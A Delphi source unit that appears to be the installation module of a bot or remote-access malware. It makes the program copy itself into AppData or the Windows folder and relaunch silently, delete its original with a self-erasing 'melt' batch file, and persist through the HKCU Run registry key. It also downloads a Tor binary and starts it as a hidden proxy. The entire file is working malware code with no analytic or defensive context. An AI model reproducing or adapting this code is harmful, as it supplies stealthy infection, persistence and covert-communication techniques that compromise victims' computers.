unit untInstallation;
{$WARNINGS OFF}
interface

uses Windows, untUtils, uConfig, shellapi, untRegistry;

var
  dwThreadID:Cardinal;


procedure Install;
procedure Uninstall;
procedure cleanup;
procedure GetTor;

function CoCreateGuid(out guid: TGUID): HResult; stdcall;
  external 'ole32.dll' name 'CoCreateGuid';

implementation

procedure GetTor;
begin
  DownloadFiles(_TorUrlDownload_,LocalAppDataPath + '\' + _TorName_);
  sleep(2000);
  StartPrxyHidden(LocalAppDataPath+_TorName_);
end;

function FindWindowsDir: string;
var
  DataSize: byte;
begin
  SetLength(Result, 255);
  DataSize := GetWindowsDirectory(PChar(Result), 255);
  if DataSize <> 0 then
  begin
    Result := ownTrim(Result);
    if Result[Length(Result)] <> '\' then
      Result := Result + '\';
  end;
end;

procedure MutexCheck;
begin
  CreateMutex(nil, False, PChar(_strMutexNam_));
  If GetLastError = ERROR_ALREADY_EXISTS then
    ExitProcess(0);
end;



procedure Uninstall;
var
  regKey: HKEY;
begin
  closehandle(dwThreadID);
  regKey := HKEY_CURRENT_USER;
  DeleteKey(regKey, 'SOFTWARE\Microsoft\Windows\CurrentVersion\Run\',
    _strStartupK_);
    cleanup;
  ExitProcess(0);
end;

procedure cleanup;
var
  strMelt:AnsiString;
  hHandle, dwWritten:Cardinal;
begin
  strMelt := ':start'#13#10'ping -n 10 localhost'#13#10'del "' + Paramstr(0) + '"'#13#10
              + 'del "' + GetCurrentDir + 'tmp.bat"'#13#10
              + 'del "' + LocalAppDataPath + _TorName_ +'"';
  hHandle := CreateFile(PChar(GetCurrentDir + 'tmp.bat'),GENERIC_WRITE, 0,nil,OPEN_ALWAYS , FILE_ATTRIBUTE_NORMAL,0);
  if hHandle <> INVALID_HANDLE_VALUE then begin
    WriteFile(hHandle, strMelt[1], Length(strMelt), dwWritten, nil);
    CloseHandle(hHandle);
    ShellExecute(0, nil, PChar(GetCurrentDir + 'tmp.bat'), nil, nil, 0);
  end;
end;

procedure Melt;
var
  strMelt:AnsiString;
  hHandle, dwWritten:Cardinal;
begin
  strMelt := ':start'#13#10'ping -n 1 localhost'#13#10'del "' + Paramstr(0) + '"'#13#10
              + 'del "' + GetCurrentDir + 'tmp.bat"';
  hHandle := CreateFile(PChar(GetCurrentDir + 'tmp.bat'),GENERIC_WRITE, 0,nil,OPEN_ALWAYS , FILE_ATTRIBUTE_NORMAL,0);
  if hHandle <> INVALID_HANDLE_VALUE then begin
    WriteFile(hHandle, strMelt[1], Length(strMelt), dwWritten, nil);
    CloseHandle(hHandle);
    ShellExecute(0, nil, PChar(GetCurrentDir + 'tmp.bat'), nil, nil, 0);
  end;
end;



function InstallTo(strDir:String):Boolean;
var
  strCurrentPath:String;
begin
  Result := False;
  if Length(strDir) <> 0 then begin
    strDir := Lowercase(strDir);
    strCurrentPath := Lowercase(GetCurrentDir);
    if strCurrentPath <> strDir then
    begin
      strDir := strDir + _strFilename_;
      if CopyFile(PChar(ParamStr(0)), PChar(strDir), False) then
        if ShellExecute(0, nil, PChar(strDir), nil, nil, 0) >= 32 then
        begin

          if _boolMelt_ then
            Melt;

          ExitProcess(0);
        end;
    end;
  end;
end;

procedure Install;
var
  inpath:string;
begin
  Sleep(5000);
  MutexCheck;
  If _boolInstall_ then

    if IsVista7 then inpath := LocalAppDataPath
    else
      inpath := FindWindowsDir;
    if GetCurrentDir = inpath then exit;
      InstallTo(inpath);

  if _boolStartup_ then
    BeginThread(nil, 0, @RegistryPersistance, nil, 0, dwThreadID);
end;

end.
